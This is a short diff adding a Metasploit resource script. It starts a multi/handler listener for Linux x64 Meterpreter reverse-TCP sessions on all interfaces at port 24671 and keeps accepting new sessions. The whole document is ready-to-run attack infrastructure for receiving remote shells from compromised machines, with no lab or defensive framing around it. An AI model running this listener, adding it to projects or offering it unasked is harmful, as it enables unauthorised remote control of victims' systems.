@@ -1,0 +1,6 @@
+use multi/handler
+set payload linux/x64/meterpreter_reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 24671
+set ExitOnSession false
+exploit
